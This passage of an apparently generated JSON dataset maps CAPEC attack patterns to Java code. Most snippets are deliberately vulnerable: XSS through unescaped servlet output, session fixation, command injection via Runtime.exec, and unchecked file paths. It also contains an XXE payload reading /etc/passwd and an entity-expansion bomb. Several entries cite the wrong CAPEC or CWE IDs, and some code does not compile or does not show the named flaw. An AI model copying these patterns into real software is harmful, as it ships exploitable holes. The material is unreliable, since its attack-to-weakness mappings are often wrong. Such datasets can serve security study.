        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<iframe src='\" + userInput + \"' width='600' height='400'></iframe>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability related to the 'iFrame Overlay' attack described in CAPEC. The servlet takes user input from a request parameter and directly embeds it into an iframe's src attribute without proper validation or sanitization. This can lead to several issues:\n\n1. **Improper Restriction of Rendered UI Layers or Frames (CWE-1021)**: The iframe can load content from an untrusted source, potentially tricking the user into interacting with a malicious interface.\n2. **Cross-site Scripting (CWE-79)**: The user input is not sanitized, allowing an attacker to inject malicious scripts.\n3. **User Interface Misrepresentation (CWE-451)**: The iframe can misrepresent critical information, leading to phishing attacks.\n4. **Improper Neutralization of Script in Attributes of IMG Tags (CWE-82)**: Although this example uses an iframe, similar issues can occur with IMG tags if not properly handled.\n\nThe code snippet represents the main idea of the CAPEC by showing how an attacker can exploit improper handling of user input to overlay a malicious iframe, tricking users into interacting with a different system than they intended."
    },
    {
        "capec_id": "224",
        "capec_name": "Fingerprinting",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class FingerprintingExample {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com\");\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n\n            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String inputLine;\n            StringBuilder content = new StringBuilder();\n            while ((inputLine = in.readLine()) != null) {\n                content.append(inputLine);\n            }\n            in.close();\n            connection.disconnect();\n\n            // Print server information (vulnerable to fingerprinting)\n            System.out.println(\"Server: \" + connection.getHeaderField(\"Server\"));\n            System.out.println(\"Content-Type: \" + connection.getHeaderField(\"Content-Type\"));\n            System.out.println(\"Content: \" + content.toString());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple HTTP GET request to a specified URL (http://example.com). It retrieves and prints the server's response headers and content. The code is vulnerable to fingerprinting attacks as it exposes sensitive information such as the 'Server' and 'Content-Type' headers. An adversary can use this information to identify the server's software and version, which can then be used to discover potential weaknesses. This example embodies the CAPEC concept of fingerprinting and highlights related CWEs such as the exposure of sensitive information (CWE-200) and observable behavioral discrepancies (CWE-207)."
    },
    {
        "capec_id": "226",
        "capec_name": "Session Credential Falsification through Manipulation",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableSessionServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        HttpSession session = request.getSession();\n        String sessionId = request.getParameter(\"sessionId\");\n        if (sessionId != null) {\n            session.setAttribute(\"sessionId\", sessionId); // CWE-384: Session Fixation\n        }\n\n        String user = (String) session.getAttribute(\"user\");\n        if (user == null) {\n            user = request.getParameter(\"user\");\n            session.setAttribute(\"user\", user); // CWE-565: Reliance on Cookies without Validation and Integrity Checking\n        }\n\n        response.getWriter().println(\"Welcome, \" + user);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable implementation of session management. The code allows an attacker to manipulate session credentials to gain unauthorized access to a web application. The main vulnerability is CWE-384 (Session Fixation), where the session ID is set based on a user-provided parameter without invalidating the existing session. Additionally, the code relies on session attributes (CWE-565) without proper validation, allowing an attacker to set arbitrary session values. This snippet embodies the main idea of CAPEC-61, where an attacker manipulates session credentials to gain unauthorized access."
    },
    {
        "capec_id": "227",
        "capec_name": "Sustained Client Engagement",
        "code_snippet": "import java.util.concurrent.Executors;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.TimeUnit;\n\npublic class ResourceEngagement {\n    private static final int MAX_THREADS = 100;\n    private static final ThreadPoolExecutor executor = (ThreadPoolExecutor) Executors.newFixedThreadPool(MAX_THREADS);\n\n    public static void main(String[] args) throws InterruptedException {\n        for (int i = 0; i < 1000; i++) {\n            executor.submit(() -> {\n                try {\n                    // Simulate a long-running task\n                    TimeUnit.SECONDS.sleep(10);\n                } catch (InterruptedException e) {\n                    Thread.currentThread().interrupt();\n                }\n            });\n        }\n        executor.shutdown();\n        executor.awaitTermination(1, TimeUnit.HOURS);\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary can engage a resource (a thread pool) in a sustained manner, leading to denial of service for legitimate users. The code creates a fixed thread pool with a maximum of 100 threads and submits 1000 tasks that each sleep for 10 seconds. This simulates a situation where the resource (thread pool) is kept busy for an extended period, preventing legitimate users from accessing it. This embodies the main idea of the CAPEC 'Sustained Client Engagement' by tying up the resource without crashing or flooding it. The related CWEs are represented by the lack of proper resource control (CWE-400), no limits on resource allocation (CWE-770), and insufficient control of resource usage (CWE-406)."
    },
    {
        "capec_id": "228",
        "capec_name": "DTD Injection",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport java.io.StringReader;\nimport javax.xml.XMLConstants;\nimport javax.xml.transform.stream.StreamSource;\nimport javax.xml.validation.SchemaFactory;\n\npublic class DTDInjectionExample {\n    public static void main(String[] args) {\n        String xmlData = \"<?xml version=\\\"1.0\\\"?>\\n\" +\n                        \"<!DOCTYPE root [\\n\" +\n                        \"<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">\\n\" +\n                        \"]>\\n\" +\n                        \"<root>&xxe;</root>\";\n\n        try {\n            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n            dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\n            dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", false);\n            dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", true);\n            dbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", true);\n\n            DocumentBuilder db = dbf.newDocumentBuilder();\n            Document doc = db.parse(new InputSource(new StringReader(xmlData)));\n\n            System.out.println(\"Parsed XML: \" + doc.getDocumentElement().getTextContent());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a DTD Injection vulnerability. The XML data contains a malicious DTD that defines an external entity 'xxe' which references the local file '/etc/passwd'. The DocumentBuilderFactory is configured to allow external entities and DTDs, which can lead to XML External Entity (XXE) attacks. This code embodies the main idea of CAPEC-112 (DTD Injection) and is related to several CWEs, including CWE-611 (Improper Restriction of XML External Entity Reference) and CWE-827 (Improper Control of Document Type Definition). The code parses the XML data and prints the content of the 'root' element, which in this case would be the content of the '/etc/passwd' file if the attack is successful."
    },
    {
        "capec_id": "229",
        "capec_name": "Serialized Data Parameter Blowup",
        "code_snippet": "import java.io.StringReader;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport org.w3c.dom.Document;\nimport org.xml.sax.InputSource;\n\npublic class VulnerableXMLParser {\n    public static void main(String[] args) {\n        String maliciousXML = \"<root>\";\n        for (int i = 0; i < 100000; i++) {\n            maliciousXML += \"<element>value</element>\";\n        }\n        maliciousXML += \"</root>\";\n\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document doc = builder.parse(new InputSource(new StringReader(maliciousXML)));\n            System.out.println(\"Parsed successfully\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to the 'Serialized Data Parameter Blowup' attack. The code constructs a large XML document with a massive number of repetitive elements, which can cause a denial of service (DoS) condition when parsed by an inefficient XML parser. The DocumentBuilderFactory and DocumentBuilder classes are used to parse the XML, but no limits are imposed on the size or complexity of the input, leading to potential resource exhaustion (CWE-770). Additionally, the code does not handle XML external entities (CWE-611), which could further exacerbate the vulnerability. This example highlights the importance of implementing proper resource limits and secure parsing practices to prevent such attacks."
    },
    {
        "capec_id": "230",
        "capec_name": "Serialized Data with Nested Payloads",
        "code_snippet": "import javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport org.w3c.dom.Document;\nimport java.io.StringReader;\nimport javax.xml.parsers.ParserConfigurationException;\nimport org.xml.sax.InputSource;\nimport org.xml.sax.SAXException;\nimport java.io.IOException;\n\npublic class VulnerableXMLParser {\n    public static void main(String[] args) {\n        String maliciousXML = \"<!DOCTYPE root [<!ENTITY lol 'lol'><!ENTITY lol2 '&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;'><!ENTITY lol3 '&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;'><!ENTITY lol4 '&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;'><!ENTITY lol5 '&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;'><!ENTITY lol6 '&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;'><!ENTITY lol7 '&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;'><!ENTITY lol8 '&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;'><!ENTITY lol9 '&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;'><!ENTITY lol10 '&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;'>]><root>&lol10;</root>\";\n\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document document = builder.parse(new InputSource(new StringReader(maliciousXML)));\n            System.out.println(\"Parsed XML successfully\");\n        } catch (ParserConfigurationException | SAXException | IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to 'Serialized Data with Nested Payloads' (CAPEC-112). The code uses an XML parser to process a malicious XML string containing deeply nested entities. This can lead to excessive memory consumption and CPU utilization, potentially causing a denial of service (DoS) attack. The code does not validate the XML against a schema (CWE-112), improperly handles input validation (CWE-20), and does not control recursion (CWE-674). Additionally, it allocates resources without limits (CWE-770) and relies on machine-dependent data representation (CWE-1102). The main idea is to show how an adversary can exploit nested structures in serialized data to exhaust system resources."
    },
    {
        "capec_id": "231",
        "capec_name": "Oversized Serialized Data Payloads",
        "code_snippet": "import java.io.ByteArrayInputStream;\nimport java.io.ObjectInputStream;\nimport java.io.Serializable;\n\npublic class VulnerableDeserializer {\n    public static void main(String[] args) {\n        try {\n            // Simulate receiving a serialized object from an untrusted source\n            byte[] serializedData = new byte[1000000]; // Oversized payload\n            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(serializedData);\n            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);\n\n            // Deserialize the object without validation\n            Object obj = objectInputStream.readObject();\n            System.out.println(\"Deserialized object: \" + obj);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    // Example of a serializable class\n    static class ExampleObject implements Serializable {\n        private static final long serialVersionUID = 1L;\n        private String data;\n\n        public ExampleObject(String data) {\n            this.data = data;\n        }\n\n        @Override\n        public String toString() {\n            return \"ExampleObject{data='\" + data + \"'}\";\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to 'Oversized Serialized Data Payloads' (CAPEC). The code simulates receiving a serialized object from an untrusted source and deserializes it without any validation. The byte array 'serializedData' is intentionally oversized to illustrate how an adversary could inject a large payload to exhaust system resources. The code does not validate the input (CWE-20), does not impose any limits on the size of the serialized data (CWE-770), and relies on Java's default serialization mechanism, which can be machine-dependent (CWE-1102). This can lead to resource exhaustion or other adverse effects on the parser."
    },
    {
        "capec_id": "233",
        "capec_name": "Privilege Escalation",
        "code_snippet": "public class PrivilegeEscalationExample {\n    private boolean isAdmin = false;\n\n    public void login(String username, String password) {\n        // Simulate login logic\n        if (\"admin\".equals(username) && \"adminPass\".equals(password)) {\n            isAdmin = true;\n        }\n    }\n\n    public void performAdminTask() {\n        if (isAdmin) {\n            System.out.println(\"Admin task performed.\");\n        } else {\n            System.out.println(\"Insufficient privileges.\");\n        }\n    }\n\n    public void escalatePrivileges() {\n        // Vulnerability: Improper Privilege Management (CWE-269)\n        isAdmin = true; // This line simulates a privilege escalation vulnerability\n    }\n\n    public static void main(String[] args) {\n        PrivilegeEscalationExample example = new PrivilegeEscalationExample();\n        example.login(\"user\", \"userPass\");\n        example.performAdminTask(); // Should print \"Insufficient privileges.\"\n\n        // Simulate an attack that escalates privileges\n        example.escalatePrivileges();\n        example.performAdminTask(); // Should print \"Admin task performed.\"\n    }\n}",
        "description": "This Java code snippet demonstrates a privilege escalation vulnerability. The `login` method simulates a user login, setting the `isAdmin` flag to true only if the correct admin credentials are provided. The `performAdminTask` method checks if the user has admin privileges before performing an admin task. The `escalatePrivileges` method represents a vulnerability where an attacker can improperly escalate their privileges by directly setting the `isAdmin` flag to true, bypassing the normal authentication checks. This example embodies the main idea of CAPEC-233 (Privilege Escalation) and CWE-269 (Improper Privilege Management) by showing how an attacker can exploit a weakness to gain unauthorized privileges."
    },
    {
        "capec_id": "234",
        "capec_name": "Hijacking a privileged process",
        "code_snippet": "import java.io.*;\n\npublic class PrivilegedProcess {\n    public static void main(String[] args) {\n        try {\n            // CWE-250: Execution with Unnecessary Privileges\n            ProcessBuilder pb = new ProcessBuilder(\"/bin/sh\", \"-c\", \"ls /root\");\n            pb.redirectErrorStream(true);\n            Process process = pb.start();\n\n            // CWE-114: Process Control\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            process.waitFor();\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a privileged process that can be hijacked by an attacker. The code uses a ProcessBuilder to execute a shell command with elevated privileges (CWE-250: Execution with Unnecessary Privileges). The command lists the contents of the /root directory, which typically requires root privileges. The ProcessBuilder does not validate the command or its source, leading to CWE-114: Process Control, where executing commands from an untrusted source can result in malicious code execution. This snippet embodies the main idea of CAPEC-233: Hijacking a privileged process, as it shows how an attacker could gain control of a process with elevated privileges to execute arbitrary commands."
    },
    {
        "capec_id": "235",
        "capec_name": "DEPRECATED: Implementing a callback to system routine (old AWT Queue)",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableServer {\n    private static String secret = \"SensitiveData\";\n\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            new Thread(new ClientHandler(clientSocket)).start();\n        }\n    }\n\n    private static class ClientHandler implements Runnable {\n        private Socket clientSocket;\n\n        public ClientHandler(Socket socket) {\n            this.clientSocket = socket;\n        }\n\n        @Override\n        public void run() {\n            try {\n                BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n                PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n                String inputLine;\n                while ((inputLine = in.readLine()) != null) {\n                    if (inputLine.equals(\"GET_SECRET\")) {\n                        out.println(secret);\n                    }\n                }\n                clientSocket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable server that listens for incoming connections on port 8080. The server spawns a new thread for each client connection, handling requests in a multi-threaded environment. The main vulnerability here is the exposure of sensitive data ('secret') through a simple command ('GET_SECRET'). This demonstrates the concept of 'Hijacking a Privileged Thread of Execution' (CAPEC-30) by allowing an attacker to potentially exploit the server's thread handling to gain unauthorized access to sensitive information. Additionally, the use of a non-final static variable ('secret') in a multi-threaded context aligns with CWE-1058, highlighting the risk of unsafe static member data elements in such environments."
    },
    {
        "capec_id": "236",
        "capec_name": "DEPRECATED: Catching exception throw/signal from privileged block",
        "code_snippet": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class PrivilegedThreadHijack {\n    public static void main(String[] args) {\n        try {\n            // Simulate privileged operation\n            performPrivilegedOperation();\n        } catch (Exception e) {\n            // Catching all exceptions without proper handling\n            System.out.println(\"An error occurred: \" + e.getMessage());\n        }\n    }\n\n    private static void performPrivilegedOperation() throws IOException {\n        // Simulate reading a sensitive file\n        String content = new String(Files.readAllBytes(Paths.get(\"/etc/shadow\")));\n        System.out.println(\"Sensitive data: \" + content);\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where a privileged operation (reading a sensitive file) is performed within a try-catch block. The catch block catches all exceptions but does not handle them properly, merely printing the error message. This can be exploited by an attacker to hijack the privileged thread of execution, as the exception handling is insufficient. The code also touches on CWE-391 (Unchecked Error Condition) by ignoring proper error handling, which can lead to unexpected behavior. The main idea is to show how improper exception handling in privileged code can be a security vulnerability."
    },
    {
        "capec_id": "237",
        "capec_name": "Escaping a Sandbox by Calling Code in Another Language",
        "code_snippet": "public class SandboxEscape {\n    static {\n        System.loadLibrary(\"nativeLib\"); // Load native C library\n    }\n\n    // Native method declaration\n    private native void performUnsafeOperation();\n\n    public static void main(String[] args) {\n        SandboxEscape escape = new SandboxEscape();\n        escape.performUnsafeOperation(); // Call to native method\n    }\n}\n\n// Corresponding C code (nativeLib.c)\n#include <jni.h>\n#include <stdio.h>\n#include <stdlib.h>\n\nJNIEXPORT void JNICALL Java_SandboxEscape_performUnsafeOperation(JNIEnv *env, jobject obj) {\n    // Unsafe operation: modifying arbitrary memory location\n    int *ptr = (int *)malloc(sizeof(int));\n    *ptr = 42; // Arbitrary memory modification\n    printf(\"Unsafe operation performed: %d\\n\", *ptr);\n    free(ptr);\n}",
        "description": "This Java code snippet demonstrates a potential sandbox escape by calling native C code using the Java Native Interface (JNI). The Java class `SandboxEscape` loads a native library `nativeLib` and declares a native method `performUnsafeOperation`. In the `main` method, it calls this native method. The corresponding C code for the native library performs an unsafe operation by modifying an arbitrary memory location. This example embodies the main idea of CAPEC-142: 'Escaping a Sandbox by Calling Code in Another Language'. It also highlights CWE-111: 'Direct Use of Unsafe JNI', as the Java application exposes itself to potential vulnerabilities in the native C code. The code snippet is concise and represents the main point of the CAPEC by showing how an attacker could escape the Java sandbox and perform unsafe operations through native code."
    },
    {
        "capec_id": "238",
        "capec_name": "DEPRECATED: Using URL/codebase / G.A.C. (code source) to convince sandbox of privilege",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends HttpServlet {\n    private static final String SECRET_PATH = \"/admin/secret\";\n\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String requestedPath = request.getRequestURI();\n\n        // Authorization check before canonicalization\n        if (isAuthorized(request) && requestedPath.equals(SECRET_PATH)) {\n            response.getWriter().write(\"Access granted to secret area.\");\n        } else {\n            response.getWriter().write(\"Access denied.\");\n        }\n    }\n\n    private boolean isAuthorized(HttpServletRequest request) {\n        // Dummy authorization logic\n        String userRole = (String) request.getSession().getAttribute(\"role\");\n        return \"admin\".equals(userRole);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability where authorization checks are performed before URL canonicalization (CWE-551). The servlet checks if the user is authorized to access a secret path based on their role. However, the requested URL is not canonicalized before the authorization check, potentially allowing an attacker to bypass the authorization by manipulating the URL. This snippet also reflects CWE-424, as it does not sufficiently protect all possible paths to access restricted functionality. The code violates secure design principles (CWE-657) by not following best practices for secure URL handling and authorization."
    },
    {
        "capec_id": "239",
        "capec_name": "DEPRECATED: Subversion of Authorization Checks: Cache Filtering, Programmatic Security, etc.",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableServer {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server started on port 8080\");\n\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n\n            String clientMessage = in.readLine();\n            if (clientMessage.equals(\"AUTHENTICATE\")) {\n                out.println(\"AUTH_SUCCESS\");\n            } else {\n                out.println(\"AUTH_FAIL\");\n            }\n\n            // Client-side enforcement of server-side security\n            if (clientMessage.equals(\"DELETE_DATA\")) {\n                out.println(\"DATA_DELETED\");\n            }\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable server that embodies the main idea of the deprecated CAPEC and related CWEs. The server listens on port 8080 and accepts client connections. It performs a simple authentication check based on a client message. If the client sends 'AUTHENTICATE', the server responds with 'AUTH_SUCCESS'. However, the server also allows a client to send 'DELETE_DATA' to delete data without verifying if the client is authenticated. This demonstrates CWE-602 (Client-Side Enforcement of Server-Side Security) and CWE-603 (Use of Client-Side Authentication), as the server relies on the client to enforce security mechanisms, making it vulnerable to bypassing authentication and authorization checks."
    },
    {
        "capec_id": "240",
        "capec_name": "Resource Injection",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class ResourceInjectionExample extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String fileName = request.getParameter(\"file\");\n        \n        // CWE-20: Improper Input Validation\n        if (fileName == null || fileName.isEmpty()) {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"File name is missing\");\n            return;\n        }\n        \n        // CWE-99: Improper Control of Resource Identifiers\n        File file = new File(\"/var/www/uploads/\" + fileName);\n        \n        // CWE-1285: Improper Validation of Specified Index, Position, or Offset in Input\n        if (!file.exists() || !file.isFile()) {\n            response.sendError(HttpServletResponse.SC_NOT_FOUND, \"File not found\");\n            return;\n        }\n        \n        // CWE-913: Improper Control of Dynamically-Managed Code Resources\n        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.getWriter().println(line);\n            }\n        } catch (IOException e) {\n            response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, \"Error reading file\");\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a resource injection vulnerability. The code reads a file name from an HTTP request parameter and attempts to read and display the file's contents. The main idea of the CAPEC is represented by the lack of proper input validation and control over resource identifiers. Specifically, the code does not adequately validate the 'file' parameter (CWE-20), allowing an attacker to manipulate the file path (CWE-99). Additionally, the code does not properly check if the file exists or is a valid file (CWE-1285), and it does not restrict access to dynamically-managed code resources (CWE-913). This can lead to unintended file access and potential security risks."
    },
    {
        "capec_id": "241",
        "capec_name": "DEPRECATED: Code Injection",
        "code_snippet": "import java.util.Scanner;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter a class name to load:\");\n        String className = scanner.nextLine();\n\n        try {\n            // CWE-470: Use of Dynamic Class Loading\n            Class<?> cls = Class.forName(className);\n            Object instance = cls.getDeclaredConstructor().newInstance();\n            System.out.println(\"Class \" + className + \" loaded successfully.\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n\nclass ExampleClass {\n    public ExampleClass() {\n        System.out.println(\"ExampleClass instance created.\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to CAPEC-242: Code Injection, specifically through the use of dynamic class loading (CWE-470). The program prompts the user to input a class name, which it then attempts to load and instantiate using reflection. This can be exploited by an attacker to load arbitrary classes, potentially leading to code execution vulnerabilities. The code also indirectly touches on CWE-477 (Use of Obsolete Function) by not validating or sanitizing user input, which is a deprecated practice in secure coding."
    },
    {
        "capec_id": "242",
        "capec_name": "Code Injection",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.IOException;\n\npublic class CodeInjectionExample {\n    public static void main(String[] args) {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n        System.out.print(\"Enter a command: \");\n        try {\n            String userInput = reader.readLine();\n            // Vulnerable code: directly using user input in a command\n            Process process = Runtime.getRuntime().exec(userInput);\n            BufferedReader processReader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = processReader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a classic example of code injection vulnerability. The program reads a command from the user input and directly executes it using `Runtime.getRuntime().exec()`. This is dangerous because it allows an attacker to inject arbitrary commands, potentially leading to severe security issues such as unauthorized access or data manipulation. The code does not perform any input validation or neutralization of special elements, making it susceptible to CWE-94 (Improper Control of Generation of Code), CWE-77 (Command Injection), and CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component)."
    },
    {
        "capec_id": "243",
        "capec_name": "XSS Targeting HTML Attributes",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class XSSVulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"userInput\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<a href='#' style='color:red;' onmouseover='\" + userInput + \"'>Hover over me!</a>\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability to Cross-Site Scripting (XSS) targeting HTML attributes. The servlet takes user input from a request parameter and directly inserts it into an HTML attribute without proper sanitization. Specifically, the user input is placed inside the 'onmouseover' attribute of an anchor tag. If an attacker provides a malicious script as input, it will be executed when a user hovers over the link, leading to potential XSS attacks. This example embodies the main idea of CAPEC-83 and related CWEs, highlighting the risks of improper neutralization of script in HTML attributes."
    },
    {
        "capec_id": "244",
        "capec_name": "XSS Targeting URI Placeholders",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/vulnerable\")\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"input\");\n        String htmlResponse = \"<html><body>\" +\n                              \"<a href='\" + userInput + \"'>Click me</a>\" +\n                              \"</body></html>\";\n        response.getWriter().write(htmlResponse);\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability to XSS targeting URI placeholders. The servlet takes a user-provided input from the 'input' parameter and directly embeds it into an anchor tag's href attribute without proper neutralization. This can be exploited by an attacker to inject a malicious URI, such as 'javascript:alert(1)', which will execute when the victim clicks the link. This example embodies the main idea of CAPEC-139 and is related to CWEs 83, 82, 84, 79, and 86, as it fails to neutralize dangerous attributes and encoded URI schemes, leading to potential cross-site scripting attacks."
    },
    {
        "capec_id": "245",
        "capec_name": "XSS Using Doubled Characters",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        // Vulnerable code: improper neutralization of doubled characters\n        if (userInput != null && userInput.contains(\"<<script>\")) {\n            response.getWriter().println(\"<html><body>\" + userInput + \"</body></html>\");\n        } else {\n            response.getWriter().println(\"<html><body>No script detected</body></html>\");\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability to Cross-Site Scripting (XSS) using doubled characters. The code retrieves a user input parameter from the HTTP request and checks if it contains the string '<<script>'. If this condition is met, the input is directly included in the HTML response without proper sanitization. This allows an attacker to bypass input validation by using doubled characters (e.g., '<<script>'), which some filters may fail to recognize as a dangerous sequence. The code snippet embodies the main idea of CAPEC-85 and related CWEs by showing how improper neutralization of input can lead to XSS vulnerabilities."
    },
    {
        "capec_id": "246",
        "capec_name": "DEPRECATED: XSS Using Flash",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        String sanitizedInput = userInput.replaceAll(\"<script>\", \"\"); // Incomplete denylist\n        response.getWriter().println(\"<img src='\" + sanitizedInput + \"'>\"); // Improper neutralization in IMG tag\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability related to the deprecated CAPEC for XSS using Flash, now covered by CAPEC-174 and CAPEC-591. The code takes user input from an HTTP GET request and attempts to sanitize it using an incomplete denylist (CWE-692). The sanitized input is then directly inserted into an IMG tag's src attribute without proper neutralization (CWE-82). This can lead to XSS attacks if an attacker manages to bypass the simplistic denylist. The code represents the main idea of the CAPEC by showing how improper input handling and neutralization can lead to security vulnerabilities."
    },
    {
        "capec_id": "247",
        "capec_name": "XSS Using Invalid Characters",
